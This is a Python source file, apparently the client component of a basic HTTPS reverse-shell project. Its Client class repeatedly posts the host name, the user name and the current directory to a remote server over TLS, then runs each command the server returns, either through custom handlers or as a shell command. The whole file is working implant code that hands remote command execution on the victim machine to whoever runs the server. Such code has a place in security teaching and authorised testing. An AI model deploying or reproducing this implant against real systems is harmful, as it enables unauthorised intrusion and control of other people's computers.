#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import getpass
import http.client
import platform
import ssl
from pathlib import Path
from urllib import request, parse

from src.client.commands import ClientCommands


class Client:
    def __init__(self,
                 server_address: str,
                 server_port: int,
                 ca_file: [str, Path]):
        self.server_url = f"https://{server_address}:{server_port}"
        self.commands = ClientCommands(self)
        self.ssl_context = ssl.create_default_context(
            purpose=ssl.Purpose.SERVER_AUTH,
            cafile=str(ca_file)
        )

    @property
    def shell_prompt(self) -> str:
        return f"{platform.node()}@{getpass.getuser()}:" \
               f"{str(self.commands.get_cwd())}$ "

    def execute(self) -> None:
        while True:
            try:
                response: str = self.post({"prompt": self.shell_prompt})
            except (http.client.RemoteDisconnected, KeyboardInterrupt):
                break
            cmd, *args = response.split(" ")
            try:
                if len(cmd) == 0:    # "cmd" is an empty string
                    continue
                else:                # "cmd" is a user-defined command
                    getattr(self.commands, cmd)(args)
            except AttributeError:   # "cmd" is a standard shell command
                self.commands.shell(response)

    def post(self, request_body: dict[str, str]) -> str:
        request_body: bytes = parse.urlencode(request_body).encode()
        url = request.Request(self.server_url, data=request_body)
        return request.urlopen(url=url,
                               context=self.ssl_context).read().decode()


if __name__ == "__main__":
    SERVER_ADDRESS = "localhost"
    SERVER_PORT = 4443
    CA_FILE = Path(__file__).parents[1].joinpath("ca.crt")

    Client(SERVER_ADDRESS, SERVER_PORT, CA_FILE).execute()
